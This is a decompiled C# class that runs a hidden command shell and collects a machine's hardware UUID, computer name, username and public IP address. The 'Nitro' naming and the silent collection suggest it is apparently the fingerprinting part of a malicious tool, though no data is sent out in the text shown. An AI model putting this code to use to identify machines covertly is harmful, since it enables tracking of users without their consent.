using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;

namespace Nitro;

internal class User
{
	private class Cmd : IDisposable
	{
		private Process cmdProcess;

		private StreamWriter sw;

		private AutoResetEvent outputWaitHandle;

		private string cmdOutput;

		public Cmd(string cmdPath)
		{
			cmdProcess = new Process();
			outputWaitHandle = new AutoResetEvent(initialState: false);
			cmdOutput = string.Empty;
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = cmdPath,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardInput = true,
				CreateNoWindow = true
			};
			cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
			cmdProcess.StartInfo = startInfo;
			cmdProcess.Start();
			sw = cmdProcess.StandardInput;
			cmdProcess.BeginOutputReadLine();
		}

		public void Dispose()
		{
			cmdProcess.Close();
			cmdProcess.Dispose();
			sw.Close();
			sw.Dispose();
		}

		public string ExecuteCommand(string command)
		{
			cmdOutput = string.Empty;
			sw.WriteLine(command);
			sw.WriteLine("echo end");
			outputWaitHandle.WaitOne();
			return cmdOutput;
		}

		private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			if (e.Data != null && !(e.Data == "end"))
			{
				cmdOutput = cmdOutput + e.Data + Environment.NewLine;
			}
			else
			{
				outputWaitHandle.Set();
			}
		}
	}

	private static Logs logging = new Logs("DEBUG", 0);

	public static string GetIdentifier()
	{
		string result = string.Empty;
		try
		{
			using Cmd cmd = new Cmd("cmd.exe");
			result = cmd.ExecuteCommand("wmic csproduct get uuid").Split(new char[1] { '\n' })[6];
			return result;
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
			return result;
		}
	}

	public static List<string> GetDetails()
	{
		List<string> list = new List<string>();
		string environmentVariable = Environment.GetEnvironmentVariable("COMPUTERNAME");
		string environmentVariable2 = Environment.GetEnvironmentVariable("UserName");
		list.Add(environmentVariable);
		list.Add(environmentVariable2);
		return list;
	}

	public static string GetIP()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		string result = string.Empty;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				result = val.GetAsync("https://api.ipify.org").Result.get_Content().ReadAsStringAsync().Result;
				return result;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
			return result;
		}
	}
}
